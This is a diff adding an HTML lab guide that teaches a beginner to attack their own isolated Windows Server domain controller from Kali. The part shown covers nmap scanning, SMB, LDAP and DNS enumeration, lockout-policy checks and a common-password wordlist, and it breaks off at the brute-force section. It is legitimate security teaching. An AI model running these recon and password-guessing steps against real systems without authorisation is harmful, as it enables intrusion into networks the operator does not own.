@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Attacking Windows Server 2022 &mdash; A Beginner's Red-Team Companion</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- ==================== COVER ==================== -->
+<div class="cover">
+  <div>
+    <div class="kicker">SIEM Lab &middot; Volume 3 &middot; Red Team</div>
+    <h1>Attacking Your Own Windows<br>Server from Kali, Then Fixing It</h1>
+    <div class="rule"></div>
+    <h2>The offensive counterpart to Volume&nbsp;2, rewritten for a first-timer. Every command is
+        broken into pieces so you know exactly what each part does &mdash; and every weakness you
+        find is closed again at the end.</h2>
+    <div class="meta">
+      <table>
+        <tr><td>Written for</td><td>Someone who has <strong>never</strong> used these tools before</td></tr>
+        <tr><td>Target</td><td>WinServer &mdash; Windows Server 2022 Domain Controller (<code>corp.local</code>), at <code>10.0.0.10</code></td></tr>
+        <tr><td>Attack host</td><td>Kali Linux <code>10.0.0.30</code> (VirtualBox, <code>intnet</code>)</td></tr>
+        <tr><td>Defender</td><td>SIEM-Ubuntu <code>10.0.0.40</code> &mdash; Wazuh 4.14.8</td></tr>
+        <tr><td>Lab network</td><td>VirtualBox <code>intnet</code>, <code>10.0.0.0/24</code>, fully isolated from the internet</td></tr>
+        <tr><td>How to use it</td><td>Read Part&nbsp;0, then Part&nbsp;1. Type every command yourself, one at a time, on <strong>your own VM</strong>.</td></tr>
+      </table>
+    </div>
+    <div class="note">
+      <strong>Read this before anything else.</strong> Every command in this document is meant to be
+      run against <code>10.0.0.10</code> &mdash; the Windows Server VM <em>you built</em>, on an
+      isolated VirtualBox network with no route to the internet. Attacking a computer you do not own
+      or have written permission to test is a crime in every jurisdiction. The skill is identical
+      whether you use it as an attacker or a defender; only the paperwork (and the jail time) is
+      different. Keep it in the lab.
+    </div>
+  </div>
+</div>
+
+<!-- ==================== SCOPE ==================== -->
+<h1 class="sec nobreak">Scope &mdash; who, what, and why</h1>
+
+<p class="lead">This is the mirror image of Volume&nbsp;2. That document hardened your server and
+proved your SIEM detected the changes. This one attacks the server the way a real intruder would, so
+that (a) you understand what the defender is defending against, and (b) you can watch your own
+detections fire in Wazuh.</p>
+
+<div class="box b-ok">
+  <span class="bt">In scope</span>
+  <p><strong>One machine you own: the WinServer VM at <code>10.0.0.10</code>, attacked from the Kali
+  VM at <code>10.0.0.30</code>, on the isolated <code>intnet</code> segment.</strong> Reconnaissance,
+  enumeration, credential attacks, and post-exploitation are all in scope <em>because you own the
+  target and the network is disconnected from everything</em>. Snapshot the VM before you begin so a
+  mistake costs you two minutes, not an evening.</p>
+</div>
+
+<div class="box b-bad">
+  <span class="bt">Out of scope &mdash; permanently</span>
+  <p>Any machine you do not own. Any network that reaches the internet. Your school, someone else's
+  Wi-Fi, a &ldquo;friend's&rdquo; server. <strong>Never run Responder, Hydra or an exploit on a
+  network you do not control</strong> &mdash; they are loud, they attack everyone on the segment at
+  once, and that is exactly what turns a curious beginner into a criminal case. If in doubt, stop.</p>
+</div>
+
+<table class="d wrap">
+  <tr><th style="width:46%">What you will learn to actually do</th><th>What this guide still will not make you</th></tr>
+  <tr>
+    <td>
+      &bull; Find and fingerprint a host on a network<br>
+      &bull; Read a Windows server's services, domain, users and shares without logging in<br>
+      &bull; Attack passwords the smart way: spray, brute-force, AS-REP roast, Kerberoast<br>
+      &bull; Poison name resolution to steal a hash, and crack it<br>
+      &bull; Read and understand every command you type<br>
+      &bull; Fix every single one of those weaknesses, and detect them
+    </td>
+    <td>
+      &bull; A licensed penetration tester. There is a legal and reporting side this does not cover<br>
+      &bull; An expert at any of these tools. Real engagements need weeks of reading<br>
+      &bull; Someone who can attack safely off the lab bench. Do <strong>not</strong> reuse these
+          commands on a production network until you fully understand them
+    </td>
+  </tr>
+</table>
+
+<!-- ==================== TOC ==================== -->
+<h1 class="sec nobreak">Contents</h1>
+<div class="toc">
+  <div><span class="n">0</span> How to read this guide (shell basics &amp; the command boxes)</div>
+  <div><span class="n">1</span> How an attack actually works (the kill chain)</div>
+  <div><span class="n">2</span> Recon &mdash; find the target, map its doors</div>
+  <div><span class="n">3</span> Enumeration &mdash; read it before you break it</div>
+  <div><span class="n">4</span> Credential attacks &mdash; the main event (your brute-force example)</div>
+  <div><span class="n">5</span> Turning a password into a shell</div>
+  <div><span class="n">6</span> Post-exploitation &mdash; showing impact, then stopping</div>
+  <div><span class="n">7</span> Remediation &mdash; fix everything you just broke (the whole point)</div>
+  <div><span class="n">8</span> Cheat sheet, glossary &amp; writeup template</div>
+  <div><span class="n">A</span> Finding-by-finding results table for your report</div>
+</div>
+
+<!-- ==================== PART 0 ==================== -->
+<h1 class="sec">0 &nbsp;How to read this guide</h1>
+
+<p class="lead">If you have never opened a terminal before, read this page twice. Every command in
+this document follows the same shape, and once you can read one command you can read them all.</p>
+
+<h2>0.1 The terminal</h2>
+<p>On Kali, open the <strong>Terminal</strong> app (a black rectangle icon in the top-left, or press
+<kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>T</kbd>). You get a prompt that looks like
+<code>kali@kali:~$</code>. You type a command, press <strong>Enter</strong>, and the computer answers
+in text. That back-and-forth is the whole interface for the tools in this guide.</p>
+
+<h2>0.2 The command boxes</h2>
+<p>Whenever you see a dark box, it is a command to type into that terminal:</p>
+<pre>sudo nmap -sn 10.0.0.0/24
+<span class="cmt"># anything in grey after a # is a comment &mdash; do NOT type it</span></pre>
+
+<table class="d wrap">
+  <tr><th style="width:26%">What you see</th><th>What it means</th></tr>
+  <tr><td class="mono">sudo</td><td>&ldquo;SuperUser DO.&rdquo; Run the rest of the command as the administrator. It may ask for a password &mdash; type <strong>your Kali login password</strong> (<code>kali</code>). Nothing appears as you type it; that is normal. Press Enter.</td></tr>
+  <tr><td class="mono">anything after #</td><td>A comment. Notes for you. Never type it.</td></tr>
+  <tr><td class="mono">\ at the end of a line</td><td>&ldquo;The command continues on the next line.&rdquo; Type the whole thing as one command (or paste it).</td></tr>
+  <tr><td class="mono">SOMETHING or &lt;value&gt;</td><td>A placeholder. Replace it with your own value. Example: <code>rockyou.txt</code> &rarr; the actual path.</td></tr>
+  <tr><td class="mono">-x or --xyz</td><td>A <strong>flag</strong> (an option). Flags change what a command does. Every flag is explained in the table right below the command.</td></tr>
+</table>
+
+<h2>0.3 The command-anatomy tables</h2>
+<p>Below <em>every</em> important command in this guide there is a small table titled
+&ldquo;Command anatomy.&rdquo; It splits the command into pieces and tells you what each piece does.
+Here is a worked example &mdash; read the table top to bottom and the command will make sense:</p>
+
+<pre>sudo nmap -sn 10.0.0.0/24</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">sudo</td><td>Run as administrator (the scan needs low-level network access).</td></tr>
+  <tr><td class="mono">nmap</td><td>The tool. <em>Nmap</em> is the industry-standard network scanner.</td></tr>
+  <tr><td class="mono">-sn</td><td>&ldquo;No port scan.&rdquo; Just tell me which hosts are alive. (An <code>s</code> is a scan type, <code>n</code> for &ldquo;no ports.&rdquo;)</td></tr>
+  <tr><td class="mono">10.0.0.0/24</td><td>The target. The <code>/24</code> means &ldquo;all 254 addresses from .1 to .254,&rdquo; i.e. the whole lab subnet.</td></tr>
+</table>
+
+<div class="box b-info">
+  <span class="bt">Three habits that make this painless</span>
+  <ul>
+    <li><strong>Paste, don't rush.</strong> Copy a command into the terminal and read the anatomy table before pressing Enter.</li>
+    <li><strong>Ctrl&nbsp;+&nbsp;C stops anything.</strong> If a command seems stuck or is running forever, hold <kbd>Ctrl</kbd> and press <kbd>C</kbd> to stop it.</li>
+    <li><strong>One command at a time.</strong> Run it, read the output, then move on. This guide is written so the output of each step tells you whether to continue.</li>
+  </ul>
+</div>
+
+<!-- ==================== PART 1 ==================== -->
+<h1 class="sec">1 &nbsp;How an attack actually works</h1>
+
+<p class="lead">Beginners imagine hacking as typing exploit code until a shell pops. In reality it is
+a slow, boring, methodical loop: <em>gather &rarr; understand &rarr; guess &rarr; try &rarr; repeat</em>.
+The whole job is done in stages, and each stage only exists to feed the next.</p>
+
+<h2>1.1 The five stages</h2>
+<div class="flow">
+  <span class="n">Recon</span><span class="ar">&rarr;</span>
+  <span class="n">Enumeration</span><span class="ar">&rarr;</span>
+  <span class="n">Credential attack</span><span class="ar">&rarr;</span>
+  <span class="n">Exploitation</span><span class="ar">&rarr;</span>
+  <span class="n">Post-exploitation</span>
+</div>
+
+<table class="d wrap">
+  <tr><th style="width:24%">Stage</th><th style="width:34%">What it means in plain English</th><th>On your lab</th></tr>
+  <tr><td><strong>Recon</strong></td><td>&ldquo;Who is out there and what ports are open?&rdquo; Like walking a street writing down which houses have open windows.</td><td>Find <code>10.0.0.10</code> and list its open ports.</td></tr>
+  <tr><td><strong>Enumeration</strong></td><td>&ldquo;What can I learn without breaking in?&rdquo; Names, the domain, users, shares, versions.</td><td>Discover domain <code>corp.local</code>, users, SMB settings.</td></tr>
+  <tr><td><strong>Credential attack</strong></td><td>&ldquo;Can I get a username and password?&rdquo; Guess weak ones, capture hashes, or roast the Kerberos protocol.</td><td>Your brute-force example lives here.</td></tr>
+  <tr><td><strong>Exploitation</strong></td><td>&ldquo;Use the password to log in and run code.&rdquo;</td><td>WinRM shell, SMB, or RDP.</td></tr>
+  <tr><td><strong>Post-exploitation</strong></td><td>&ldquo;What more can I reach now that I am in?&rdquo; Other users, hashes, the whole domain.</td><td>Dump local hashes, attempt DCSync, show impact.</td></tr>
+</table>
+
+<h2>1.2 Your lab, drawn out</h2>
+<pre>  HOST (Windows 11)  ──────────────────────────────────────────────
+     │  VirtualBox
+     │
+     ├── Kali          10.0.0.30   ← YOU attack from here  (this doc)
+     ├── WinServer DC  10.0.0.10   ← the target  (Server 2022, domain corp.local)
+     └── SIEM-Ubuntu   10.0.0.40   ← Wazuh watches. Turn it on to see yourself get caught.
+                          all three on VirtualBox "intnet", 10.0.0.0/24, no internet
+</pre>
+
+<div class="box b-info">
+  <span class="bt">What we actually found on <em>your</em> server (from the live recon run)</span>
+  <p>This guide is not generic &mdash; it is written around what your VM actually exposes:</p>
+  <ul>
+    <li>Host role: <strong>Active Directory Domain Controller</strong> (not a plain member server).</li>
+    <li>Domain: <code>corp.local</code> &middot; computer name: <code>SERVER</code> &middot; OS build <code>20348.587</code> (early 2022 patch level &mdash; old).</li>
+    <li>Open &amp; interesting: <code>53</code> DNS, <code>88</code> Kerberos, <code>135</code> RPC, <code>389/636</code> LDAP, <code>445</code> SMB, <code>464</code> kpasswd, <code>3268/3269</code> Global Catalog, <code>5985</code> WinRM.</li>
+    <li>Already well defended: <strong>SMB signing required</strong>, <strong>SMBv1 disabled</strong>, <strong>anonymous LDAP search denied</strong>, <strong>RDP (3389) closed on the lab network</strong>.</li>
+  </ul>
+  <p style="margin-top:2mm">Translation: the &ldquo;easy&rdquo; network exploits are closed, so the
+  realistic path is exactly the one you named &mdash; <strong>credentials</strong>. That is a perfect
+  first target.</p>
+</div>
+
+<h2>1.3 Set up your three tools of war</h2>
+<div class="step">
+  <span class="sn">1</span> <span class="st">Snapshot the target first.</span>
+  <p>In VirtualBox, select <strong>WinServer</strong> &rarr; Snapshots &rarr; Take. If you break it,
+  restore in seconds. Do this now, not when you need it.</p>
+</div>
+<div class="step">
+  <span class="sn">2</span> <span class="st">Boot Kali and confirm your lab address.</span>
+</div>
+<pre>ip -br a</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">ip</td><td>The modern Linux networking tool.</td></tr>
+  <tr><td class="mono">-br</td><td>&ldquo;Brief.&rdquo; One tidy line per network card instead of a wall of detail.</td></tr>
+  <tr><td class="mono">a</td><td>Shortcut for the <code>address</code> sub-command &rarr; show IP addresses.</td></tr>
+</table>
+<p class="tcap">You should see <code>10.0.0.30/24</code> on <code>eth0</code> (the <code>intnet</code> card). If not, fix your Kali network before going on.</p>
+
+<div class="step">
+  <span class="sn">3</span> <span class="st">Make a working folder and confirm the target is alive.</span>
+</div>
+<pre>mkdir -p ~/lab/redteam
+cd ~/lab/redteam
+ping -c2 10.0.0.10</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">mkdir -p ~/lab/redteam</td><td><em>Make directory</em>. <code>-p</code> creates the parent folders too and does not complain if it already exists. <code>~</code> means your home folder (<code>/home/kali</code>). You now have a tidy folder for this exercise.</td></tr>
+  <tr><td class="mono">cd ~/lab/redteam</td><td><em>Change directory</em> &mdash; go into that folder so the files you make later land there.</td></tr>
+  <tr><td class="mono">ping -c2 10.0.0.10</td><td><em>Ping</em> sends tiny test packets. <code>-c2</code> = send exactly 2 then stop (otherwise it pings forever). If you get replies, your target is reachable.</td></tr>
+</table>
+
+<div class="box b-warn">
+  <span class="bt">A hiccup you may hit (we did)</span>
+  <p>If the target suddenly stops answering after heavy scanning, it is a VirtualBox quirk where the
+  guest's little virtual network card drops while idle. Fix it by re-plugging the virtual cable from
+  the host: <code>VBoxManage controlvm "WinServer" setlinkstate1 off</code> then
+  <code>... setlinkstate1 on</code>. Then scan again. Nothing is broken.</p>
+</div>
+
+<!-- ==================== PART 2 ==================== -->
+<h1 class="sec">2 &nbsp;Recon &mdash; find the target, map its doors</h1>
+
+<p class="lead">You cannot attack what you cannot see. Recon answers two questions: <em>which IP is
+my server?</em> and <em>which ports are open on it?</em> Do not skip this to &ldquo;get to the
+hacking&rdquo; &mdash; everything later depends on it.</p>
+
+<h2>2.1 Find the host</h2>
+<p>The lab network has no DHCP. Your server has a static address; you just do not know it yet.
+Everything on <code>10.0.0.0/24</code> that is alive is a VM. Sweep the network:</p>
+<pre>sudo nmap -sn 10.0.0.0/24</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">sudo</td><td>Run as admin. Scanners need raw network access.</td></tr>
+  <tr><td class="mono">nmap</td><td>The scanner. Reads like &ldquo;N-map&rdquo; &mdash; <em>Network Mapper</em>.</td></tr>
+  <tr><td class="mono">-sn</td><td>Host-discovery only (no ports). &ldquo;Just tell me who is alive.&rdquo;</td></tr>
+  <tr><td class="mono">10.0.0.0/24</td><td>Your whole lab subnet (254 addresses). You are asking about all of them at once.</td></tr>
+</table>
+<p class="tcap">Output we got &mdash; the server is <code>10.0.0.10</code>, MAC <code>08:00:27:F7:2C:54</code>.</p>
+<pre>Nmap scan report for 10.0.0.10
+Host is up (0.0015s latency).
+MAC Address: 08:00:27:F7:2C:54 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 10.0.0.30
+Host is up.</pre>
+
+<div class="box b-info">
+  <span class="bt">Reading this output</span>
+  <p>&ldquo;Host is up&rdquo; means it answered. The <strong>MAC address</strong> is the hardware
+  address of the network card &mdash; the <code>08:00:27</code> prefix is VirtualBox's fingerprint, which
+  proves it is a VM, not a physical machine. Other tools for the same job: <code>ip neigh</code> (look
+  at your ARP table), <code>arp-scan --localnet</code>, and <code>netdiscover -r 10.0.0.0/24</code>.</p>
+</div>
+
+<h2>2.2 Map the doors (port scan)</h2>
+<p>A port is a numbered door into the machine (0&ndash;65535). A scan tells you which are open. Two
+passes: a fast sweep of all ports to find the open ones, then a slow, careful pass on just those to
+learn what is behind them.</p>
+<pre>sudo nmap -Pn -sS -p- --min-rate 2000 -T4 10.0.0.10 -oN nmap-all.txt
+sudo nmap -Pn -sV -sC -p 53,88,135,389,445,464,636,3268,3269,5985,9389,47001 10.0.0.10 -oN nmap-services.txt</pre>
+
+<h4>Anatomy of the first (fast) scan</h4>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-Pn</td><td>&ldquo;Treat the host as up; don't test with a ping first.&rdquo; Windows firewalls often block ping, so this stops us from wrongly thinking the host is offline.</td></tr>
+  <tr><td class="mono">-sS</td><td><strong>SYN scan</strong> (aka &ldquo;half-open&rdquo;). Sends the first half of a connection handshake and reads the reply, then backs off. Fast and quiet. Needs <code>sudo</code>.</td></tr>
+  <tr><td class="mono">-p-</td><td>&ldquo;All ports.&rdquo; The lone dash means <strong>1 through 65535</strong> instead of nmap's default 1000.</td></tr>
+  <tr><td class="mono">--min-rate 2000</td><td>Send at least <strong>2000 packets per second</strong>. Makes a full scan take seconds, not hours.</td></tr>
+  <tr><td class="mono">-T4</td><td>Timing template 4 of 6 = &ldquo;aggressive/fast.&rdquo; (<code>-T0</code> is paranoid-slow, <code>-T5</code> is insane-fast.)</td></tr>
+  <tr><td class="mono">10.0.0.10</td><td>The target.</td></tr>
+  <tr><td class="mono">-oN nmap-all.txt</td><td>Save the <strong>N</strong>ormal output to a file so you can read it later.</td></tr>
+</table>
+
+<h4>Anatomy of the second (version) scan</h4>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-sV</td><td><strong>Version detection.</strong> Poke each open port to learn the software and version behind it.</td></tr>
+  <tr><td class="mono">-sC</td><td>Run nmap's <strong>default scripts</strong> &mdash; safe little probes that gather extra detail (SMB settings, TLS info, and so on).</td></tr>
+  <tr><td class="mono">-p 53,88,&hellip;</td><td>Only scan this comma-separated list of ports (the ones the first scan found open). Faster than re-scanning everything.</td></tr>
+</table>
+
+<table class="d wrap">
+  <tr><th class="c" style="width:14%">Port</th><th style="width:22%">Service</th><th>Why a beginner cares</th></tr>
+  <tr><td class="mono c">445</td><td>SMB (file sharing)</td><td>Password attacks, share listing, hashes. The single most useful port.</td></tr>
+  <tr><td class="mono c">88</td><td>Kerberos</td><td>User enumeration, AS-REP roasting, Kerberoasting &mdash; two of the best attacks in the book.</td></tr>
+  <tr><td class="mono c">389 / 636</td><td>LDAP / LDAPS</td><td>Read the directory: users, groups, everything.</td></tr>
+  <tr><td class="mono c">5985</td><td>WinRM</td><td>Once you have a password, this gives you a remote shell.</td></tr>
+  <tr><td class="mono c">53</td><td>DNS</td><td>Leaks the domain name and internal names.</td></tr>
+  <tr><td class="mono c">3389</td><td>RDP (closed here)</td><td>Graphical login &mdash; closed on your lab net. Note that and move on.</td></tr>
+</table>
+
+<div class="box b-ok">
+  <span class="bt">What a beginner should take from this scan</span>
+  <p>So many services at once, in this exact pattern, means <strong>Domain Controller</strong>. That
+  is the most important machine on any Windows network, and it is why this lab is a great target: one
+  password on a DC can mean the whole kingdom.</p>
+</div>
+
+<!-- ==================== PART 3 ==================== -->
+<h1 class="sec">3 &nbsp;Enumeration &mdash; read it before you break it</h1>
+
+<p class="lead">Enumeration is asking the server polite questions and writing down the answers.
+Nothing here is an exploit; it is all the server volunteering information. The more you collect, the
+smaller your guesswork later.</p>
+
+<h2>3.1 SMB: share list and settings</h2>
+<pre>smbclient -L //10.0.0.10 -N
+netexec smb 10.0.0.10
+enum4linux -a 10.0.0.10</pre>
+
+<h4>Anatomy: <span class="mono">smbclient</span></h4>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">smbclient</td><td>An SMB &ldquo;client&rdquo; &mdash; the Linux equivalent of typing <code>\\server</code> into a Windows File Explorer.</td></tr>
+  <tr><td class="mono">-L //10.0.0.10</td><td><strong>L</strong>ist the shares on that host (the shared folders).</td></tr>
+  <tr><td class="mono">-N</td><td>No password &mdash; try an <em>anonymous</em> (null) session, as if we had no account.</td></tr>
+</table>
+
+<h4>Anatomy: <span class="mono">netexec</span></h4>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">netexec</td><td>The modern, all-in-one AD tool (also called <code>nxc</code> or <code>cme</code>). Think &ldquo;one hammer for every Windows service.&rdquo;</td></tr>
+  <tr><td class="mono">smb</td><td>The protocol to speak. Other choices are <code>winrm</code>, <code>ldap</code>, <code>ssh</code>.</td></tr>
+  <tr><td class="mono">10.0.0.10</td><td>The target. With no <code>-u/-p</code> it tries anonymous and just reports basics.</td></tr>
+</table>
+<p class="tcap">What <code>netexec</code> told us:</p>
+<pre>Windows Server 2022 Build 20348 x64 (name:SERVER) (domain:corp.local)
+(signing:True) (SMBv1:None) (Null Auth:True)</pre>
+
+<h4>Anatomy: <span class="mono">enum4linux</span></h4>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">enum4linux</td><td>A classic script that runs many small queries and prints everything it can about a Windows/Samba host.</td></tr>
+  <tr><td class="mono">-a</td><td>&ldquo;All.&rdquo; Run every check: users, shares, OS info, groups, and more.</td></tr>
+</table>
+
+<table class="d wrap">
+  <tr><th style="width:24%">Reading</th><th>Meaning</th></tr>
+  <tr><td><code>signing:True</code></td><td>Every SMB packet is signed. This <strong>blocks SMB relay attacks</strong> &mdash; good defence, and it tells you to attack differently (capture &amp; crack, not relay).</td></tr>
+  <tr><td><code>SMBv1:None</code></td><td>The ancient, wormable SMBv1 is off. No EternalBlue-style freebie here.</td></tr>
+  <tr><td><code>Null Auth:True</code></td><td>You can connect with no username. Nice, but the DC still refuses to list users/shares this way (we tried &mdash; <code>ACCESS_DENIED</code>).</td></tr>
+</table>
+
+<h2>3.2 LDAP: read the directory (the crown jewels)</h2>
+<p>LDAP is how Windows exposes its phone book: users, groups, computers. The anonymous root read
+works, but searching for objects is refused until you authenticate.</p>
+<pre>ldapsearch -x -LLL -H ldap://10.0.0.10 -s base -b "" namingContexts
+ldapsearch -x -LLL -H ldap://10.0.0.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName</pre>
+
+<h4>Anatomy of the first (anonymous root) query</h4>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">ldapsearch</td><td>The LDAP query tool &mdash; like a search engine for the directory.</td></tr>
+  <tr><td class="mono">-x</td><td>Use &ldquo;simple&rdquo; authentication (and here, none &mdash; anonymous).</td></tr>
+  <tr><td class="mono">-LLL</td><td>Print clean output: no comments, no version header, no extra blank lines.</td></tr>
+  <tr><td class="mono">-H ldap://10.0.0.10</td><td><strong>H</strong>ost &mdash; the server to talk to (the LDAP URL).</td></tr>
+  <tr><td class="mono">-s base</td><td>Search <strong>s</strong>cope <code>base</code> &mdash; look only at the very root object, not the whole tree.</td></tr>
+  <tr><td class="mono">-b ""</td><td><strong>B</strong>ase DN &mdash; start at the root (&ldquo;empty&rdquo;).</td></tr>
+  <tr><td class="mono">namingContexts</td><td>The attribute we want. This one reveals the domain's real name.</td></tr>
+</table>
+<pre><span class="cmt"># This is what we got:</span>
+namingContexts: DC=corp,DC=local
+dnsHostName: Server.corp.local</pre>
+
+<h4>Anatomy of the second (object search) query</h4>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-b "DC=corp,DC=local"</td><td>Search this part of the tree &mdash; the domain we just learned the name of.</td></tr>
+  <tr><td class="mono">"(objectClass=user)"</td><td>The <strong>filter</strong> &mdash; &ldquo;give me every object that is a user.&rdquo;</td></tr>
+  <tr><td class="mono">sAMAccountName</td><td>The one attribute to print per result &mdash; the Windows login name.</td></tr>
+</table>
+<pre><span class="cmt"># Searching the directory without a bind is refused:</span>
+ldapsearch -x -LLL -H ldap://10.0.0.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
+<span class="erro">Operations error: ... a successful bind must be completed on the connection.</span></pre>
+<p class="tcap">&ldquo;Bind&rdquo; means log in. The error is the server politely saying &ldquo;log in first.&rdquo; We will, in Part 5, once we have a password. Good defence on your part.</p>
+
+<h2>3.3 DNS: squeeze out internal names</h2>
+<pre>dig @10.0.0.10 corp.local NS
+nslookup 10.0.0.10 10.0.0.10</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">dig</td><td>DNS lookup tool. Ask questions about the domain's name system.</td></tr>
+  <tr><td class="mono">@10.0.0.10</td><td>Ask <em>this</em> server (the DC is also the DNS server). Without it, you'd ask your own resolver.</td></tr>
+  <tr><td class="mono">corp.local NS</td><td>Look up the <strong>N</strong>ame <strong>S</strong>erver records &mdash; confirms the zone exists.</td></tr>
+  <tr><td class="mono">nslookup 10.0.0.10 10.0.0.10</td><td>Reverse lookup: &ldquo;which name goes with this IP?&rdquo; (first is the target, second is the DNS server to ask).</td></tr>
+</table>
+
+<h2>3.4 What we now know</h2>
+<table class="d">
+  <tr><th style="width:30%">Fact</th><th>Value</th></tr>
+  <tr><td>Target IP</td><td class="mono">10.0.0.10</td></tr>
+  <tr><td>Domain</td><td class="mono">corp.local</td></tr>
+  <tr><td>Computer name</td><td class="mono">SERVER</td></tr>
+  <tr><td>Role</td><td>Domain Controller, Windows Server 2022 build 20348.587</td></tr>
+  <tr><td>Known account</td><td class="mono">administrator</td> (the built-in Domain Admin, RID 500)</td></tr>
+  <tr><td>Distance from compromise</td><td><strong>One weak password.</strong></td></tr>
+</table>
+
+<!-- ==================== PART 4 ==================== -->
+<h1 class="sec">4 &nbsp;Credential attacks &mdash; the main event</h1>
+
+<p class="lead">This is the part you asked about: brute-forcing easy passwords. Before you fire a
+single guess, understand that a password attack on Active Directory has a dangerous failure mode
+called <strong>account lockout</strong> &mdash; too many wrong guesses and the account locks, alerting
+the defender and possibly breaking services. So we measure first, then attack.</p>
+
+<h2>4.1 First, learn the rules: password &amp; lockout policy</h2>
+<p>The policy dictates your entire strategy. On your own DC you can read it directly. Log into the
+server (console or RDP) as an admin and run in PowerShell:</p>
+<pre>net accounts
+Get-ADDefaultDomainPasswordPolicy</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">net accounts</td><td>A built-in Windows command that prints the password rules for this machine: minimum length, lockout threshold, lockout time.</td></tr>
+  <tr><td class="mono">Get-ADDefaultDomainPasswordPolicy</td><td>The Active Directory version &mdash; the rules for the <em>whole domain</em>. Run it in a PowerShell window on the DC.</td></tr>
+</table>
+<p class="tcap">Or, once you hold <em>any</em> valid credential, read it remotely from Kali:</p>
+<pre>netexec smb 10.0.0.10 -u SOMEUSER -p 'SOMEPASS' --pass-pol</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">-u SOMEUSER</td><td>The username to log in with.</td></tr>
+  <tr><td class="mono">-p 'SOMEPASS'</td><td>The password. Single quotes protect special characters like <code>!</code> and <code>$</code> from the shell.</td></tr>
+  <tr><td class="mono">--pass-pol</td><td>&ldquo;Show me the password policy&rdquo; now that I am authenticated.</td></tr>
+</table>
+
+<table class="d wrap">
+  <tr><th style="width:34%">Policy value</th><th>What it means for your attack</th></tr>
+  <tr><td><strong>Lockout threshold = 0</strong></td><td>No lockout. You may brute-force as hard as you like, forever. <span class="tag t-crit">free pass</span></td></tr>
+  <tr><td><strong>Lockout threshold = 5</strong></td><td>5 wrong guesses then the account locks. Now you must <em>spray</em> (below), not brute-force.</td></tr>
+  <tr><td><strong>Minimum length &lt; 8, no complexity</strong></td><td>Weak passwords exist. Cracking will succeed.</td></tr>
+  <tr><td><strong>Minimum length 14 + complexity</strong></td><td>Brute force is hopeless; you must capture a hash and crack, or find a leak.</td></tr>
+</table>
+
+<div class="box b-bad">
+  <span class="bt">The two golden rules of guessing</span>
+  <p><strong>1.</strong> Know the lockout threshold before you guess. <strong>2.</strong> Never spend
+  more guesses per account than the threshold (leave one in reserve). Breaking these rules is how
+  beginners lock out the entire domain &mdash; and get caught instantly.</p>
+</div>
+
+<h2>4.2 Making a wordlist that is actually clever</h2>
+<p>A <strong>wordlist</strong> is just a text file, one candidate password per line. Tools read it top
+to bottom. Kali ships huge ones; <code>rockyou.txt</code> (14&nbsp;million real leaked passwords) is
+the famous one. But the smart mover is a <em>targeted</em> list built from your own lab's culture.</p>
+<pre>ls /usr/share/wordlists/</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">ls</td><td><em>List</em> the contents of a folder so you can see the files.</td></tr>
+  <tr><td class="mono">/usr/share/wordlists/</td><td>Where Kali keeps its password lists. If <code>rockyou.txt</code> is missing, run <code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code>.</td></tr>
+</table>
+
+<p>Now build a small, clever list with a <strong>heredoc</strong> &mdash; a way to write many lines
+into a file at once:</p>
+<pre>cat > lab-passwords.txt &lt;&lt;'EOF'
+Password1
+Password123!
+Passw0rd
+P@ssw0rd
+P@ssw0rd!
+Welcome1
+Welcome123!
+Admin123!
+Administrator1
+corp.local
+Corp@2022
+Corp@2026
+Server2022
+Server2022!
+labadmin
+labadmin123
+lab@123
+ChangeMe123!
+Summer2026!
+Winter2026!
+EOF</pre>
+<table class="d wrap">
+  <tr><th style="width:24%">Piece</th><th>What it does</th></tr>
+  <tr><td class="mono">cat &gt; lab-passwords.txt</td><td>Take everything typed next and write it into the file <code>lab-passwords.txt</code> (this creates it).</td></tr>
+  <tr><td class="mono">&lt;&lt;'EOF'</td><td>&ldquo;Keep reading lines until you see the word <code>EOF</code>.&rdquo; The quotes prevent the shell from touching the contents &mdash; so <code>!</code> and <code>$</code> stay literal.</td></tr>
+  <tr><td class="mono">EOF</td><td>The end marker. Everything above it became the file. (You can name the marker anything, but <code>EOF</code> = End Of File is the convention.)</td></tr>
+</table>
+<div class="box b-info">
+  <span class="bt">Pro habit</span>
+  <p>Real engagements build lists from the target's own words (product names, city, season + year,
+  <code>CompanyName123</code>). Tools like <code>CeWL</code> spider a website and harvest its words;
+  <code>hashcat --rules</code> mangles a base word into hundreds of variants.</p>
+</div>
+
+<h2>4.3 Brute-force one account (SMB)</h2>
